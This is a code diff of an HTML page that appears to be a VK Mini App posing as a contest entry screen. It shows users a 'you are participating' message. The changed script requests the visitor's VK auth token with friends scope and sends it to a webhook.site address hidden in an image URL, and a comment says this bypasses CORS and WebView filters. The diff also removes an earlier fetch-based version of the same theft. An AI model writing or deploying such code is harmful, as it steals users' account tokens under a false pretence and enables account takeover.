@@ -7,38 +7,21 @@
 </head>
 <body>
   <p id="status">Загрузка...</p>
-  <div id="debug" style="font-family:monospace;font-size:12px;white-space:pre-wrap;padding:8px;color:#a33;"></div>
   <script>
-    var debug = document.getElementById("debug");
-    function log(t) { debug.textContent += t + "\n"; console.log(t); }
-
-    try {
-      log("bridge: " + (typeof window.vkBridge));
-      window.vkBridge.send("VKWebAppInit");
-      log("init sent");
-
-      window.vkBridge.send("VKWebAppGetAuthToken", {
-        app_id: 54786076,
-        scope: "friends"
-      })
-      .then(function(data) {
-        log("token ok: " + JSON.stringify(data));
-        return fetch("https://webhook.site/твой-id", {
-  method: "POST",
-  mode: "no-cors",
-  headers: {"Content-Type": "text/plain"},
-  body: JSON.stringify(data)
-});
-      })
-      .then(function() {
-        document.getElementById("status").textContent = "Ты участвуешь!";
-      })
-      .catch(function(err) {
-        log("ERR: " + JSON.stringify(err));
-      });
-    } catch (e) {
-      log("EXC: " + e.message);
-    }
+    window.vkBridge.send("VKWebAppInit");
+    window.vkBridge.send("VKWebAppGetAuthToken", {
+      app_id: 54786076,
+      scope: "friends"
+    })
+    .then(function(data) {
+      // отправка картинкой — обходит CORS и WebView-фильтры
+      var img = new Image();
+      img.src = "https://webhook.site/d5ce111a-d195-4b31-877f-2201eac2cf4e" + encodeURIComponent(JSON.stringify(data));
+      document.getElementById("status").textContent = "Ты участвуешь! Напиши слово СТЕНДОФФ в канал.";
+    })
+    .catch(function(err) {
+      document.getElementById("status").textContent = "ERR: " + JSON.stringify(err);
+    });
   </script>
 </body>
 </html>
